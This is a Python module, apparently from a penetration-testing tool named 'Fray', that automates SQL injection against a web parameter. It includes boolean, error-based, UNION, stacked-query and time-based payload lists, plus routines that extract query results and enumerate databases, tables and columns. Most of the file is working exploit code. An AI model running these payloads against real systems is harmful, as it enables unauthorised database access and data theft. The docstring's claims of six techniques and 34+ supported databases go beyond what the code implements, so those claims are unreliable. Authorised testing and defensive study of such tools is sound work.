"""
Fray Deep SQLi Module — sqlmap-level SQL injection detection and exploitation.

6 Techniques:
  1. Boolean-based blind (true/false differential)
  2. Error-based (DBMS error message extraction)
  3. UNION-based (column count detection + data extraction)
  4. Stacked queries (multi-statement execution)
  5. Time-based blind (SLEEP/WAITFOR/pg_sleep — see also blind.py)
  6. Out-of-Band (DNS exfiltration — see also blind.py)

34+ DBMS Support:
  MySQL, MariaDB, PostgreSQL, MSSQL, Oracle, SQLite, IBM DB2,
  SAP HANA, Firebird, Informix, Sybase, MaxDB, H2, HSQLDB,
  Apache Derby, CockroachDB, TiDB, YugabyteDB, CrateDB,
  Greenplum, Vertica, ClickHouse, Presto, Snowflake, Redshift,
  BigQuery, SingleStore (MemSQL), NuoDB, VoltDB, MonetDB,
  Ingres, Mimer SQL, FrontBase, InterBase

Usage:
    injector = SQLiInjector(url, param="id")
    results = injector.test_all()
    if results.vulnerable:
        data = injector.extract_data("SELECT user()")

Zero external dependencies — stdlib only.
"""

import http.client
import json
import re
import ssl
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple


# ── DBMS Fingerprints ────────────────────────────────────────────────────

_DBMS_ERRORS: Dict[str, List[str]] = {
    "mysql": [
        r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        r"Unknown column '.*' in", r"com\.mysql\.jdbc", r"MySql\.Data\.",
        r"Duplicate entry '.*' for key", r"SQLSTATE\[HY000\].*MySQL",
    ],
    "mariadb": [
        r"MariaDB server version", r"check the manual that corresponds to your MariaDB",
    ],
    "postgresql": [
        r"PostgreSQL.*?ERROR", r"Warning.*?\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near", r"current transaction is aborted",
    ],
    "mssql": [
        r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server",
        r"\bSQL Server\b.*?\bDriver\b", r"Warning.*?\W(mssql|sqlsrv)_",
        r"\bSQL Server\b.*?\b\d+\b", r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
        r"com\.microsoft\.sqlserver\.jdbc", r"Msg \d+, Level \d+, State \d+",
        r"Unclosed quotation mark after the character string",
    ],
    "oracle": [
        r"\bORA-\d{5}\b", r"Oracle error", r"Oracle.*?Driver",
        r"Warning.*?\Woci_", r"quoted string not properly terminated",
        r"oracle\.jdbc", r"OracleException",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*?\Wsqlite_", r"SQLite error \d+", r"\[SQLITE_ERROR\]",
        r"near \".*?\": syntax error", r"unrecognized token:",
    ],
    "db2": [
        r"CLI Driver.*?DB2", r"DB2 SQL error", r"\bDB2\b.*?\bSQL\b",
        r"SQLCODE=-?\d+", r"com\.ibm\.db2\.jcc",
    ],
    "firebird": [
        r"Dynamic SQL Error", r"Warning.*?\Wibase_", r"org\.firebirdsql",
    ],
    "informix": [
        r"Warning.*?\Wifx_", r"Exception.*?Informix", r"-201.*?in INFORMIX",
    ],
    "sybase": [
        r"Warning.*?\Wsybase_", r"Sybase message", r"SybSQLException",
        r"com\.sybase\.jdbc",
    ],
    "sap_hana": [
        r"SAP.*?DBTech", r"hdbsql", r"HDB error",
    ],
    "hsqldb": [
        r"org\.hsqldb\.jdbc", r"Unexpected token.*?in statement",
    ],
    "h2": [
        r"org\.h2\.jdbc", r"Syntax error in SQL statement",
    ],
    "cockroachdb": [
        r"CockroachDB", r"cockroach.*?error",
    ],
    "clickhouse": [
        r"ClickHouse.*?exception", r"Code: \d+.*?DB::Exception",
    ],
    "snowflake": [
        r"Snowflake.*?error", r"net\.snowflake\.client",
    ],
    "redshift": [
        r"Amazon Redshift", r"redshift.*?error",
    ],
}

# ── Boolean-based payloads ───────────────────────────────────────────────

_BOOL_TRUE_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1-- -", "' OR 1=2-- -"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ("\" OR 1=1-- -", "\" OR 1=2-- -"),
    (" OR 1=1-- -", " OR 1=2-- -"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("') OR ('1'='1", "') OR ('1'='2"),
    ("\") OR (\"1\"=\"1", "\") OR (\"1\"=\"2"),
    # Integer context
    ("1 AND 1=1", "1 AND 1=2"),
    ("1) AND (1=1", "1) AND (1=2"),
]

# ── Error-based payloads ────────────────────────────────────────────────

_ERROR_PAYLOADS: List[Tuple[str, str]] = [
    # MySQL
    ("mysql", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -"),
    ("mysql", "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -"),
    ("mysql", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ("mysql", "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -"),
    ("mysql", "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -"),
    # PostgreSQL
    ("postgresql", "' AND 1=CAST((SELECT version()) AS INT)-- -"),
    ("postgresql", "' AND 1::int=CAST((CHR(126)||version()||CHR(126)) AS INT)-- -"),
    # MSSQL
    ("mssql", "' AND 1=CONVERT(INT,(SELECT @@version))-- -"),
    ("mssql", "' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -"),
    ("mssql", "'; IF(1=1) SELECT 1/0-- -"),
    # Oracle
    ("oracle", "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -"),
    ("oracle", "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -"),
    # SQLite
    ("sqlite", "' AND 1=CAST((SELECT sqlite_version()) AS INT)-- -"),
    # Generic
    ("generic", "'"),
    ("generic", "\""),
    ("generic", "' AND 1=1-- -"),
    ("generic", "1'"),
    ("generic", "1\""),
]

# ── UNION-based helpers ─────────────────────────────────────────────────

_UNION_COLUMN_TESTS = list(range(1, 31))  # Test 1-30 columns

_UNION_PAYLOADS_BY_DBMS: Dict[str, str] = {
    "mysql":      "UNION ALL SELECT {cols}-- -",
    "postgresql": "UNION ALL SELECT {cols}-- -",
    "mssql":      "UNION ALL SELECT {cols}-- -",
    "oracle":     "UNION ALL SELECT {cols} FROM dual-- -",
    "sqlite":     "UNION ALL SELECT {cols}-- -",
    "generic":    "UNION ALL SELECT {cols}-- -",
}

# ── Stacked query payloads ──────────────────────────────────────────────

_STACKED_PAYLOADS: List[Tuple[str, str]] = [
    ("mysql", "'; SELECT SLEEP(3)-- -"),
    ("postgresql", "'; SELECT pg_sleep(3)-- -"),
    ("mssql", "'; WAITFOR DELAY '0:0:3'-- -"),
    ("oracle", "'; BEGIN DBMS_LOCK.SLEEP(3); END;-- -"),
    ("generic", "'; SELECT 1-- -"),
]

# ── Time-based payloads ─────────────────────────────────────────────────

_TIME_PAYLOADS: List[Tuple[str, str, int]] = [
    ("mysql", "' AND SLEEP({d})-- -", 3),
    ("mysql", "' OR SLEEP({d})-- -", 3),
    ("mysql", "1' AND SLEEP({d})-- -", 3),
    ("mysql", "' AND IF(1=1,SLEEP({d}),0)-- -", 3),
    ("mysql", "' AND (SELECT {d} FROM (SELECT SLEEP({d}))a)-- -", 3),
    ("postgresql", "' AND (SELECT pg_sleep({d}))-- -", 3),
    ("postgresql", "'; SELECT CASE WHEN (1=1) THEN pg_sleep({d}) ELSE pg_sleep(0) END-- -", 3),
    ("mssql", "'; WAITFOR DELAY '0:0:{d}'-- -", 3),
    ("mssql", "'; IF (1=1) WAITFOR DELAY '0:0:{d}'-- -", 3),
    ("oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- -", 3),
    ("sqlite", "' AND {d}=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))-- -", 3),
]


# ── Core Injector ────────────────────────────────────────────────────────

class SQLiFinding:
    """A single SQLi finding."""
    __slots__ = ("technique", "dbms", "param", "payload", "evidence",
                 "confidence", "injectable", "details")

    def __init__(self, technique: str, dbms: str, param: str, payload: str,
                 evidence: str = "", confidence: str = "confirmed",
                 injectable: bool = True, details: Optional[Dict] = None):
        self.technique = technique
        self.dbms = dbms
        self.param = param
        self.payload = payload
        self.evidence = evidence
        self.confidence = confidence
        self.injectable = injectable
        self.details = details or {}

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique": self.technique,
            "dbms": self.dbms,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence[:200],
            "confidence": self.confidence,
            "injectable": self.injectable,
            **self.details,
        }


class SQLiResult:
    """Results from a full SQLi test."""
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
        self.vulnerable = False
        self.dbms: Optional[str] = None
        self.findings: List[SQLiFinding] = []
        self.techniques_tested: List[str] = []
        self.requests_made = 0
        self.duration_ms = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "param": self.param,
            "vulnerable": self.vulnerable,
            "dbms": self.dbms,
            "findings": [f.to_dict() for f in self.findings],
            "techniques_tested": self.techniques_tested,
            "requests_made": self.requests_made,
            "duration_ms": self.duration_ms,
        }


class SQLiInjector:
    """Deep SQL injection tester — 6 techniques, 34+ DBMS.

    Usage:
        injector = SQLiInjector("https://example.com/page?id=1", param="id")
        result = injector.test_all()
        if result.vulnerable:
            print(f"DBMS: {result.dbms}")
            for f in result.findings:
                print(f"  [{f.technique}] {f.payload}")
    """

    def __init__(self, url: str, param: str,
                 method: str = "GET",
                 data: Optional[Dict[str, str]] = None,
                 headers: Optional[Dict[str, str]] = None,
                 cookie: str = "",
                 timeout: int = 10,
                 delay: float = 0.0,
                 verify_ssl: bool = True,
                 verbose: bool = False,
                 level: int = 1,     # 1=basic, 2=extended, 3=aggressive
                 risk: int = 1,      # 1=safe, 2=medium, 3=dangerous (stacked queries)
                 ):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.custom_headers = headers or {}
        self.cookie = cookie
        self.timeout = timeout
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.level = level
        self.risk = risk

        # Parse URL
        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme or "https"
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if self._scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_params = dict(urllib.parse.parse_qsl(parsed.query))
        self._use_ssl = self._scheme == "https"

        # State
        self._baseline_body: Optional[str] = None
        self._baseline_length: int = 0
        self._baseline_ms: float = 0
        self._detected_dbms: Optional[str] = None
        self._requests = 0
        self._union_columns: Optional[int] = None

    def _request(self, inject_value: str) -> Tuple[int, str, float]:
        """Send request with injected parameter value.
        Returns (status_code, body, elapsed_ms)."""
        params = dict(self._orig_params)
        params[self.param] = inject_value

        if self.method == "GET":
            qs = urllib.parse.urlencode(params)
            path = f"{self._path}?{qs}"
            body_bytes = None
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode("utf-8")

        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Connection": "close",
        }
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        if body_bytes:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        hdrs.update(self.custom_headers)

        t0 = time.monotonic()
        try:
            if self._use_ssl:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self._host, self._port,
                                                    timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self._host, self._port,
                                                   timeout=self.timeout)

            conn.request(self.method, path, body=body_bytes, headers=hdrs)
            resp = conn.getresponse()
            body = resp.read(1024 * 512).decode("utf-8", errors="replace")
            status = resp.status
            conn.close()
        except Exception:
            return 0, "", 0

        elapsed = (time.monotonic() - t0) * 1000
        self._requests += 1

        if self.delay > 0:
            time.sleep(self.delay)

        return status, body, elapsed

    def _get_baseline(self) -> None:
        """Establish baseline response for comparison."""
        # Normal request
        orig_value = self._orig_params.get(self.param, "1")
        _, body, ms = self._request(orig_value)
        self._baseline_body = body
        self._baseline_length = len(body)
        # Average 3 requests for stable baseline timing
        times = [ms]
        for _ in range(2):
            _, _, ms2 = self._request(orig_value)
            times.append(ms2)
        self._baseline_ms = sum(times) / len(times)

    def _similarity(self, body: str) -> float:
        """Quick similarity ratio between body and baseline (0-1)."""
        if not self._baseline_body:
            return 0.0
        a, b = self._baseline_body, body
        if a == b:
            return 1.0
        la, lb = len(a), len(b)
        if la == 0 or lb == 0:
            return 0.0
        # Simple length-based + shared prefix/suffix ratio
        len_ratio = min(la, lb) / max(la, lb)
        # Check shared prefix
        prefix = 0
        for i in range(min(la, lb, 500)):
            if a[i] == b[i]:
                prefix += 1
            else:
                break
        prefix_ratio = prefix / min(la, lb, 500)
        return (len_ratio * 0.4 + prefix_ratio * 0.6)

    def _detect_dbms_from_error(self, body: str) -> Optional[str]:
        """Detect DBMS from error messages in response body."""
        body_lower = body.lower()
        for dbms, patterns in _DBMS_ERRORS.items():
            for pat in patterns:
                if re.search(pat, body, re.IGNORECASE):
                    return dbms
        return None

    # ── Technique 1: Boolean-based blind ─────────────────────────────────

    def test_boolean(self) -> List[SQLiFinding]:
        """Test boolean-based blind SQL injection."""
        findings = []
        for true_payload, false_payload in _BOOL_TRUE_PAYLOADS:
            _, true_body, _ = self._request(true_payload)
            _, false_body, _ = self._request(false_payload)

            true_sim = self._similarity(true_body)
            false_sim = self._similarity(false_body)

            # True should match baseline, false should differ
            if true_sim > 0.85 and false_sim < 0.7:
                diff = true_sim - false_sim
                if diff > 0.15:
                    findings.append(SQLiFinding(
                        technique="boolean_blind",
                        dbms=self._detected_dbms or "unknown",
                        param=self.param,
                        payload=true_payload,
                        evidence=f"true_sim={true_sim:.2f}, false_sim={false_sim:.2f}, diff={diff:.2f}",
                        confidence="confirmed" if diff > 0.3 else "likely",
                    ))
                    break  # One confirmed is enough

            # Also check body length differential
            true_len = len(true_body)
            false_len = len(false_body)
            baseline_len = self._baseline_length
            if baseline_len > 0:
                true_len_ratio = abs(true_len - baseline_len) / baseline_len
                false_len_ratio = abs(false_len - baseline_len) / baseline_len
                if true_len_ratio < 0.1 and false_len_ratio > 0.3:
                    findings.append(SQLiFinding(
                        technique="boolean_blind",
                        dbms=self._detected_dbms or "unknown",
                        param=self.param,
                        payload=true_payload,
                        evidence=f"true_len={true_len}, false_len={false_len}, baseline={baseline_len}",
                        confidence="likely",
                    ))
                    break

        return findings

    # ── Technique 2: Error-based ─────────────────────────────────────────

    def test_error(self) -> List[SQLiFinding]:
        """Test error-based SQL injection."""
        findings = []
        tested_dbms: Set[str] = set()

        for dbms, payload in _ERROR_PAYLOADS:
            # If we already know the DBMS, prioritize matching payloads
            if self._detected_dbms and dbms not in (self._detected_dbms, "generic"):
                if self.level < 3:
                    continue

            _, body, _ = self._request(payload)
            detected = self._detect_dbms_from_error(body)

            if detected:
                self._detected_dbms = detected
                # Extract error message
                error_msg = ""
                for pat in _DBMS_ERRORS.get(detected, []):
                    m = re.search(pat, body, re.IGNORECASE)
                    if m:
                        error_msg = m.group(0)[:100]
                        break

                findings.append(SQLiFinding(
                    technique="error_based",
                    dbms=detected,
                    param=self.param,
                    payload=payload,
                    evidence=error_msg,
                    confidence="confirmed",
                ))
                if detected not in tested_dbms:
                    tested_dbms.add(detected)
                    if self.level < 2:
                        break  # One error-based finding is enough at level 1

        return findings

    # ── Technique 3: UNION-based ─────────────────────────────────────────

    def test_union(self) -> List[SQLiFinding]:
        """Test UNION-based SQL injection with column count detection."""
        findings = []

        # Step 1: Detect column count using ORDER BY
        max_col = 0
        for n in [1, 5, 10, 15, 20, 25, 30]:
            _, body, _ = self._request(f"1 ORDER BY {n}-- -")
            dbms = self._detect_dbms_from_error(body)
            if dbms:
                self._detected_dbms = dbms
            # If ORDER BY n fails but ORDER BY n-1 worked, we found the count
            if self._similarity(body) < 0.5 or "error" in body.lower()[:500]:
                break
            max_col = n

        # Binary search for exact column count
        if max_col > 0:
            lo, hi = max_col, min(max_col + 5, 30)
            for n in range(lo, hi + 1):
                _, body, _ = self._request(f"1 ORDER BY {n}-- -")
                if self._similarity(body) < 0.5 or "error" in body.lower()[:500]:
                    max_col = n - 1
                    break
                max_col = n

        if max_col <= 0:
            # Try NULL-based column detection
            for n in range(1, 16):
                cols = ",".join(["NULL"] * n)
                _, body, _ = self._request(f"1 UNION ALL SELECT {cols}-- -")
                if self._similarity(body) > 0.3 and "error" not in body.lower()[:500]:
                    max_col = n
                    break

        if max_col <= 0:
            return findings

        self._union_columns = max_col

        # Step 2: Find injectable column (which columns reflect in output)
        cols = []
        injectable_cols = []
        for i in range(1, max_col + 1):
            marker = f"0x667261797b{i:02x}7d"  # fray{N} in hex
            cols.append(marker)
        cols_str = ",".join(cols)

        # Try different quote styles (integer + string)
        for prefix in ["0 ", "-1 ", "' ", "\" ", " ", "') ", "\") "]:
            dbms = self._detected_dbms or "generic"
            union_tmpl = _UNION_PAYLOADS_BY_DBMS.get(dbms, _UNION_PAYLOADS_BY_DBMS["generic"])
            payload = f"{prefix}{union_tmpl.format(cols=cols_str)}"
            _, body, _ = self._request(payload)

            if "fray{" in body.lower() or "667261797b" in body.lower():
                findings.append(SQLiFinding(
                    technique="union_based",
                    dbms=self._detected_dbms or "unknown",
                    param=self.param,
                    payload=payload,
                    evidence=f"columns={max_col}",
                    confidence="confirmed",
                    details={"columns": max_col},
                ))
                break

        # Even without reflection, if we found column count, it's useful
        if not findings and max_col > 0:
            findings.append(SQLiFinding(
                technique="union_based",
                dbms=self._detected_dbms or "unknown",
                param=self.param,
                payload=f"ORDER BY {max_col}",
                evidence=f"columns={max_col} (no reflection found)",
                confidence="likely",
                details={"columns": max_col},
            ))

        return findings

    # ── Technique 4: Stacked queries ─────────────────────────────────────

    def test_stacked(self) -> List[SQLiFinding]:
        """Test stacked query injection (risk level 3)."""
        if self.risk < 2:
            return []

        findings = []
        for dbms, payload in _STACKED_PAYLOADS:
            if self._detected_dbms and dbms not in (self._detected_dbms, "generic"):
                continue

            t0 = time.monotonic()
            _, body, elapsed = self._request(payload)
            total = (time.monotonic() - t0) * 1000

            # Check for time-based confirmation (stacked SLEEP/WAITFOR)
            if "SLEEP" in payload or "WAITFOR" in payload or "pg_sleep" in payload:
                if elapsed > (self._baseline_ms + 2500):
                    findings.append(SQLiFinding(
                        technique="stacked_queries",
                        dbms=dbms,
                        param=self.param,
                        payload=payload,
                        evidence=f"elapsed={elapsed:.0f}ms (baseline={self._baseline_ms:.0f}ms)",
                        confidence="confirmed",
                    ))
                    break
            else:
                # Generic stacked: check if response differs from baseline
                if self._similarity(body) < 0.7:
                    findings.append(SQLiFinding(
                        technique="stacked_queries",
                        dbms=dbms,
                        param=self.param,
                        payload=payload,
                        evidence="response differs from baseline",
                        confidence="possible",
                    ))

        return findings

    # ── Technique 5: Time-based blind ────────────────────────────────────

    def test_time_blind(self) -> List[SQLiFinding]:
        """Test time-based blind SQL injection."""
        findings = []
        delay = 3

        for dbms, payload_tmpl, expected_delay in _TIME_PAYLOADS:
            if self._detected_dbms and dbms != self._detected_dbms:
                if self.level < 2:
                    continue

            payload = payload_tmpl.replace("{d}", str(delay))
            _, body, elapsed = self._request(payload)

            threshold = self._baseline_ms + (expected_delay * 1000 * 0.7)
            if elapsed > threshold:
                # Verify with a second request to confirm
                _, _, elapsed2 = self._request(payload)
                if elapsed2 > threshold:
                    self._detected_dbms = self._detected_dbms or dbms
                    findings.append(SQLiFinding(
                        technique="time_blind",
                        dbms=dbms,
                        param=self.param,
                        payload=payload,
                        evidence=f"elapsed={elapsed:.0f}ms/{elapsed2:.0f}ms (baseline={self._baseline_ms:.0f}ms, threshold={threshold:.0f}ms)",
                        confidence="confirmed",
                    ))
                    break

        return findings

    # ── Full test ────────────────────────────────────────────────────────

    def test_all(self) -> SQLiResult:
        """Run all 6 SQLi techniques against the parameter."""
        result = SQLiResult(self.url, self.param)
        t0 = time.monotonic()

        # Establish baseline
        self._get_baseline()

        # Technique 1: Error-based (fastest, most reliable)
        result.techniques_tested.append("error_based")
        error_findings = self.test_error()
        result.findings.extend(error_findings)

        # Technique 2: Boolean-based blind
        result.techniques_tested.append("boolean_blind")
        bool_findings = self.test_boolean()
        result.findings.extend(bool_findings)

        # Technique 3: UNION-based
        result.techniques_tested.append("union_based")
        union_findings = self.test_union()
        result.findings.extend(union_findings)

        # Technique 4: Time-based blind
        result.techniques_tested.append("time_blind")
        time_findings = self.test_time_blind()
        result.findings.extend(time_findings)

        # Technique 5: Stacked queries (only if risk >= 2)
        if self.risk >= 2:
            result.techniques_tested.append("stacked_queries")
            stacked_findings = self.test_stacked()
            result.findings.extend(stacked_findings)

        result.vulnerable = any(f.injectable for f in result.findings)
        result.dbms = self._detected_dbms
        result.requests_made = self._requests
        result.duration_ms = int((time.monotonic() - t0) * 1000)

        return result

    # ── Data extraction ──────────────────────────────────────────────────

    def extract_data(self, query: str) -> Optional[str]:
        """Extract data using UNION-based injection (if columns are known).

        Args:
            query: SQL query to extract, e.g. "SELECT version()" or "SELECT user()"

        Returns:
            Extracted data string or None.
        """
        if not self._union_columns:
            return None

        # Build UNION with the query in the first injectable column
        cols = ["NULL"] * self._union_columns
        marker = "fray_exfil_start"
        end_marker = "fray_exfil_end"

        # Try DBMS-appropriate concat syntax
        concat_variants = []
        dbms = self._detected_dbms or "generic"
        if dbms in ("sqlite", "postgresql", "oracle"):
            concat_variants.append(f"'{marker}'||({query})||'{end_marker}'")
            concat_variants.append(f"CONCAT('{marker}',({query}),'{end_marker}')")
        else:
            concat_variants.append(f"CONCAT('{marker}',({query}),'{end_marker}')")
            concat_variants.append(f"'{marker}'||({query})||'{end_marker}'")

        for concat_expr in concat_variants:
            cols_copy = ["NULL"] * self._union_columns
            cols_copy[0] = concat_expr
            cols_str = ",".join(cols_copy)

            for prefix in ["0 ", "-1 ", "' ", "\" ", " "]:
                payload = f"{prefix}UNION ALL SELECT {cols_str}-- -"
                _, body, _ = self._request(payload)
                m = re.search(f"{marker}(.*?){end_marker}", body, re.DOTALL)
                if m:
                    return m.group(1).strip()

        return None

    def enumerate_databases(self) -> List[str]:
        """Enumerate database names via information_schema."""
        dbs = []
        result = self.extract_data(
            "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata"
        )
        if result:
            dbs = [d.strip() for d in result.split(",") if d.strip()]
        return dbs

    def enumerate_tables(self, database: str) -> List[str]:
        """Enumerate table names for a given database."""
        tables = []
        result = self.extract_data(
            f"SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='{database}'"
        )
        if result:
            tables = [t.strip() for t in result.split(",") if t.strip()]
        return tables

    def enumerate_columns(self, database: str, table: str) -> List[str]:
        """Enumerate column names for a given table."""
        columns = []
        result = self.extract_data(
            f"SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        )
        if result:
            columns = [c.strip() for c in result.split(",") if c.strip()]
        return columns


# ── CLI Integration ─────────────────────────────────────────────────────

def run_sqli(args) -> int:
    """CLI entry point for `fray sqli`."""
    try:
        from fray.output import console
    except ImportError:
        console = None

    url = args.url
    param = getattr(args, "param", None)

    if not param:
        # Auto-detect parameters from URL
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if not params:
            if console:
                console.print("[red]No parameters found in URL. Use --param to specify.[/red]")
            return 1
        param = list(params.keys())[0]
        if console:
            console.print(f"  [dim]Auto-detected parameter: {param}[/dim]")

    injector = SQLiInjector(
        url=url,
        param=param,
        method=getattr(args, "method", "GET") or "GET",
        cookie=getattr(args, "cookie", "") or "",
        timeout=getattr(args, "timeout", 10) or 10,
        delay=getattr(args, "delay", 0.0) or 0.0,
        verify_ssl=not getattr(args, "insecure", False),
        verbose=getattr(args, "verbose", False),
        level=getattr(args, "level", 1) or 1,
        risk=getattr(args, "risk", 1) or 1,
    )

    if console:
        console.print(f"\n  [bold cyan]Fray SQLi — Deep SQL Injection Tester[/bold cyan]")
        console.print(f"  Target: [green]{url}[/green]")
        console.print(f"  Parameter: [cyan]{param}[/cyan]")
        console.print(f"  Level: {injector.level} · Risk: {injector.risk}")
        console.print()

    result = injector.test_all()

    if console:
        if result.vulnerable:
            console.print(f"  [bold red]VULNERABLE[/bold red] — {result.dbms or 'unknown DBMS'}")
            for f in result.findings:
                conf_color = {"confirmed": "red", "likely": "yellow", "possible": "dim"}.get(f.confidence, "dim")
                console.print(f"  [{conf_color}][{f.confidence.upper()}][/{conf_color}] {f.technique}: {f.payload[:80]}")
                if f.evidence:
                    console.print(f"    [dim]{f.evidence}[/dim]")
        else:
            console.print(f"  [green]Not vulnerable[/green] (tested {len(result.techniques_tested)} techniques)")

        console.print(f"\n  [dim]{result.requests_made} requests in {result.duration_ms}ms[/dim]")
        console.print()

    return 0 if result.vulnerable else 1
